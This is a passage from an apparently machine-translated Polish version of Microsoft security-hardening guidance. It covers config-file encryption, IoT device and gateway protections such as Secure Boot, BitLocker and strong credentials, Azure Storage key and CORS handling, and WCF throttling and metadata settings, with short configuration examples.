| **Odwołania**              | [Instrukcje: Szyfrowanie sekcji konfiguracyjnych w ASP.NET 2.0 przy użyciu interfejsu DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [Określanie dostawcę konfiguracji chronionych](https://msdn.microsoft.com/library/68ze1hb2.aspx), [przy użyciu usługi Azure Key Vault do ochrony wpisu tajnego aplikacji](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Kroki** | Pliki konfiguracji, takie jak pliku Web.config, appsettings.json są często używane do przechowywania informacji poufnych, w tym nazwy użytkownika, hasła, parametry połączenia bazy danych i kluczy szyfrowania. Jeśli te informacje nie jest chroniony, aplikacja jest narażony na ataki lub złośliwym użytkownikom uzyskania poufne informacje, takie jak nazwy użytkownika konta i hasła, nazwy baz danych i serwerów nazw. Oparte na dany typ wdrożenia (azure/lokalnych), szyfrowanie poufnych części plików konfiguracji przy użyciu interfejsu DPAPI lub usług, takich jak usługi Azure Key Vault. |

## <a id="admin-strong"></a>Upewnij się, że wszystkie interfejsów administracyjnych są zabezpieczone przy użyciu silnych poświadczeń

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Interfejsów administracyjnych, które uwidacznia pola lub urządzenia bramy, powinien zostać zabezpieczony za pomocą silnych poświadczeń. Ponadto innych interfejsów, takich jak sieć Wi-Fi i SSH, udziałów plików, FTP, powinien zostać zabezpieczony za pomocą silnych poświadczeń. Nie można używać domyślnej słabe hasła. |

## <a id="unknown-exe"></a>Upewnij się, że nieznany kod nie można wykonać na urządzeniach

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Włączenie funkcji Bezpieczny rozruch i skrytki bitowe szyfrowanie urządzenia w systemie Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Kroki** | Bezpieczny rozruch z interfejsem UEFI ogranicza systemu, aby zezwalać tylko na wykonywanie plików binarnych podpisany przez określony urząd. Ta funkcja zapobiega nieznany kod wykonywany na platformie i potencjalnie osłabienia stan zabezpieczeń go. Włączyć bezpieczny rozruch z interfejsem UEFI i ogranicz listę urzędów certyfikacji, które są zaufane do podpisywania kodu. Zarejestruj cały kod, który jest wdrożony na urządzeniu przy użyciu jednej z zaufanych urzędów. |

## <a id="partition-iot"></a>Szyfrowanie systemu operacyjnego i dodatkowe partycje urządzeń IoT za pomocą skrytki bitowe

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Windows 10 IoT Core implementuje Uproszczona wersja skrytki bitowe szyfrowanie urządzeń, która silne zależny od obecności modułu TPM na platformie, łącznie z protokołem preOS niezbędne w interfejsie UEFI, który wykonuje niezbędne pomiarów. Te pomiary preOS zapewnić system operacyjny później ostateczne rekordu jak został uruchomiony system operacyjny. Szyfrowanie partycji systemu operacyjnego przy użyciu bitowego skrytki i wszelkie dodatkowe partycje, również w przypadku, gdy ich przechowywania poufnych danych. |

## <a id="min-enable"></a>Upewnij się, że tylko minimalne usług/funkcji są włączone na urządzeniach

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Urządzenia IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Nie włączaj ani nie Wyłącz wszystkie funkcje lub usługi w systemie operacyjnym, który nie jest wymagany do funkcjonowania rozwiązania. Na przykład jeśli urządzenie nie wymaga interfejsu użytkownika do wdrożenia, należy zainstalować Windows IoT Core, w trybie bezobsługowego. |

## <a id="field-bit-locker"></a>Szyfrowanie systemu operacyjnego i dodatkowe partycje bramy w terenie IoT przy użyciu bitowego skrytki

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Bramy w terenie IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Windows 10 IoT Core implementuje Uproszczona wersja skrytki bitowe szyfrowanie urządzeń, która silne zależny od obecności modułu TPM na platformie, łącznie z protokołem preOS niezbędne w interfejsie UEFI, który wykonuje niezbędne pomiarów. Te pomiary preOS zapewnić system operacyjny później ostateczne rekordu jak został uruchomiony system operacyjny. Szyfrowanie partycji systemu operacyjnego przy użyciu bitowego skrytki i wszelkie dodatkowe partycje, również w przypadku, gdy ich przechowywania poufnych danych. |

## <a id="default-change"></a>Upewnij się, że poświadczenia logowania domyślnej bramy pola zostały zmienione podczas instalacji

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Bramy w terenie IoT | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Upewnij się, że poświadczenia logowania domyślnej bramy pola zostały zmienione podczas instalacji |

## <a id="cloud-firmware"></a>Upewnij się, że bramy w chmurze implementuje proces aktualizowania oprogramowania układowego połączonych urządzeń

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | IoT Cloud Gateway | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | Wybór bramy — usługi Azure IoT Hub |
| **Odwołania**              | [Omówienie zarządzania urządzeniami Centrum IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [sposobu aktualizowania oprogramowania układowego urządzenia](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **Kroki** | LWM2M jest protokołem z Otwórz Alliance Mobile w usłudze zarządzania urządzeniami IoT. Zarządzanie urządzeniami w usłudze Azure IoT umożliwia interakcję z urządzeniami fizycznymi, za pomocą zadań urządzeń. Upewnij się, że bramy w chmurze implementuje proces rutynowo zapewnienie urządzenia i inne dane konfiguracyjne aktualności przy użyciu zarządzania urządzeniami w usłudze Azure IoT Hub. |

## <a id="controls-policies"></a>Upewnij się, że urządzenia mają skonfigurowane zgodnie z zasadami organizacji kontroli zabezpieczeń punktu końcowego

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Maszyny granicy zaufania | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | Zapewnić, że urządzenia mają punkt końcowy kontroli bezpieczeństwa, np bit skrytki dla szyfrowanie na poziomie dysku, oprogramowanie antywirusowe z podpisami zaktualizowane, na podstawie zapora, uaktualnienia systemu operacyjnego hosta, grupy zasad itp., zostały skonfigurowane zgodnie z zasadami zabezpieczeń organizacji. |

## <a id="secure-keys"></a>Upewnij się, bezpieczne zarządzanie kluczami dostępu do magazynu platformy Azure

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Wdrożenie |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Usługa Azure Przewodnik po zabezpieczeniach magazynu — Zarządzanie Your kluczy konta magazynu](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Kroki** | <p>Magazyn kluczy: Zalecane jest przechowywanie kluczy dostępu do magazynu Azure w usłudze Azure Key Vault jako klucz tajny i aplikacjami, pobrać klucza z magazynu kluczy. Jest to zalecane, z następujących przyczyn:</p><ul><li>Aplikacja nigdy nie będzie miała zakodowaną klucza magazynu w pliku konfiguracji, co spowoduje usunięcie tego ścieżek osoba uzyska dostęp do kluczy bez wyraźnej zgody</li><li>Dostęp do kluczy mogą być kontrolowane za pomocą usługi Azure Active Directory. Oznacza to, że właściciel konta może udzielić dostępu do kilku aplikacji, które wymagają, aby pobrać klucze z usługi Azure Key Vault. Inne aplikacje nie będą mogli uzyskać dostęp do kluczy bez nadawania im uprawnienia specjalnie</li><li>Ponowne generowanie klucza: Zalecane jest procesem, które umożliwią ponownego generowania kluczy dostępu do magazynu platformy Azure ze względów bezpieczeństwa. Szczegółowe informacje o tym, dlaczego i jak planowanie ponownego wygenerowania klucza są udokumentowane w artykule dotyczącym struktury Przewodnik po zabezpieczeniach magazynu platformy Azure</li></ul>|

## <a id="cors-storage"></a>Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS w usłudze Azure storage

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Azure Storage | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Obsługa mechanizmu CORS w przypadku usług Azure Storage](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Kroki** | Usługa Azure Storage umożliwia włączanie mechanizmu CORS — Cross współużytkowanie zasobów. Dla każdego konta magazynu można określić domeny, które mogą uzyskać dostęp do zasobów, w ramach tego konta magazynu. Domyślnie CORS jest wyłączona na wszystkie usługi. Przy użyciu interfejsu API REST lub biblioteka klienta magazynu do wywoływania jednej z metod, które można ustawić zasady dotyczące usług, można włączyć mechanizm CORS. |

## <a id="throttling"></a>Włączanie usługi WCF w funkcji ograniczania

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | .NET Framework 3 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [wzmacnia Królestwa](https://vulncat.fortify.com) |
| **Kroki** | <p>Nie obrotu ograniczenie użycia zasobów systemowych może spowodować wyczerpanie zasobów, a ostatecznie typu "odmowa usługi".</p><ul><li>**OBJAŚNIENIE:** Windows Communication Foundation (WCF) oferuje możliwość ograniczania żądań obsługi. Zezwolenie zbyt wiele żądań klientów można zalać systemu i wyczerpaniu zasobów. Z drugiej strony dzięki czemu tylko niewielką liczbę żądań do usługi uniemożliwi autoryzowanych użytkowników przy użyciu usługi. Każda usługa powinna indywidualnie dostosowana do i skonfigurowany do zezwalania na odpowiednią ilość zasobów.</li><li>**Zalecenia dotyczące** funkcji ograniczania przepustowości usługi i ustawianie limitów Włącz WCF odpowiednie dla twojej aplikacji.</li></ul>|

### <a name="example"></a>Przykład
Poniżej przedstawiono przykładową konfigurację po zastosowaniu ograniczania włączone:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Ujawnienie informacji programu WCF za pomocą metadanych

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | WCF | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednich technologii** | .NET Framework 3 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [wzmacnia Królestwa](https://vulncat.fortify.com) |
| **Kroki** | Metadane mogą pomóc osobom atakującym plan forma ataku i Dowiedz się więcej o systemie. Usługi WCF można skonfigurować do udostępnienia metadanych. Metadane zapewnia informacje o opisie usługi szczegółowe i nie powinny być emisji w środowiskach produkcyjnych. `HttpGetEnabled`  /  `HttpsGetEnabled` Właściwości klasy serviceMetadata w pliku Określa, czy usługa udostępni metadanych | 

### <a name="example"></a>Przykład
Poniższy kod powoduje, że usługi WCF do emisji przeznaczonych jest metadanych usługi
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Emituje metadane usługi w środowisku produkcyjnym. Ustaw HttpGetEnabled / właściwości HttpsGetEnabled ServiceMetaData klas na wartość false. 

### <a name="example"></a>Przykład
Poniższy kod powoduje, że usługi WCF do emisji metadanych usługi. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
